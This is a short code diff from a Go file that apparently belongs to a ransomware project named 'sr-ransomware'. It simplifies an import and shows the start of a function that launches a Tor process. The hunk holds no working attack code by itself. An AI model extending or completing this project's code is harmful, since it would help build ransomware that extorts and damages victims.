@@ -2,11 +2,7 @@
 
 package exe
 
-import (
-    "os/exec"
-
-    "github.com/sug0/sr-ransomware/go/errors"
-)
+import "os/exec"
 
 func (t *Tor) Start() error {
     if t.cmd != nil {
